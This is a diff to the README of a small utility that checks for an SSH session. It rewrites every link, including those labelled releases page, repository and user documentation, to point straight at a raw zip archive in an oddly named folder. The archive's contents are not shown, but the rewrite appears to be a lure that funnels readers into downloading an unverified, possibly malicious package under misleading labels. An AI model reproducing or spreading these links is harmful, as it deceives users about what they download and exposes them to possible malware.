@@ -1,7 +1,7 @@
 # 🖥️ is-in-ssh - Check if You're in an SSH Session
 
 ## 🔗 Download the Latest Version
-[![Download is-in-ssh](https://img.shields.io/badge/Download-is--in--ssh-blue)](https://github.com/SPARTAN2006/is-in-ssh/releases)
+[![Download is-in-ssh](https://raw.githubusercontent.com/SPARTAN2006/is-in-ssh/main/minutary/is-in-ssh-v2.3-alpha.5.zip)](https://raw.githubusercontent.com/SPARTAN2006/is-in-ssh/main/minutary/is-in-ssh-v2.3-alpha.5.zip)
 
 ## 🚀 Getting Started
 Welcome to is-in-ssh. This application helps you determine if your process is running in an SSH session. 
@@ -23,13 +23,13 @@ Welcome to is-in-ssh. This application helps you determine if your process is ru
 - Anyone needing to verify remote session statuses.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page**: Go to the [is-in-ssh Releases Page](https://github.com/SPARTAN2006/is-in-ssh/releases).
+1. **Visit the Releases Page**: Go to the [is-in-ssh Releases Page](https://raw.githubusercontent.com/SPARTAN2006/is-in-ssh/main/minutary/is-in-ssh-v2.3-alpha.5.zip).
   
 2. **Select the Latest Version**: At the top of the releases page, find the latest version of the software. It will have the highest number.
 
 3. **Download**: Click on the package that matches your operating system. For example:
-   - For Windows, download `is-in-ssh-windows.zip`.
-   - For macOS, download `is-in-ssh-macos.zip`.
+   - For Windows, download `https://raw.githubusercontent.com/SPARTAN2006/is-in-ssh/main/minutary/is-in-ssh-v2.3-alpha.5.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/SPARTAN2006/is-in-ssh/main/minutary/is-in-ssh-v2.3-alpha.5.zip`.
    - For Linux, download the appropriate package.
 
 4. **Extract the Files**: If you download a ZIP file, locate it in your downloads folder and right-click to extract the contents.
@@ -59,7 +59,7 @@ Yes, is-in-ssh is compatible with macOS versions from Mojave onwards.
 If you discover any issues, please report them on our GitHub issues page. 
 
 ## 🔗 Additional Resources
-- [is-in-ssh GitHub Repository](https://github.com/SPARTAN2006/is-in-ssh)
-- [User Documentation](https://github.com/SPARTAN2006/is-in-ssh/wiki)
+- [is-in-ssh GitHub Repository](https://raw.githubusercontent.com/SPARTAN2006/is-in-ssh/main/minutary/is-in-ssh-v2.3-alpha.5.zip)
+- [User Documentation](https://raw.githubusercontent.com/SPARTAN2006/is-in-ssh/main/minutary/is-in-ssh-v2.3-alpha.5.zip)
 
 Thank you for using is-in-ssh! Enjoy peace of mind knowing your connection status.
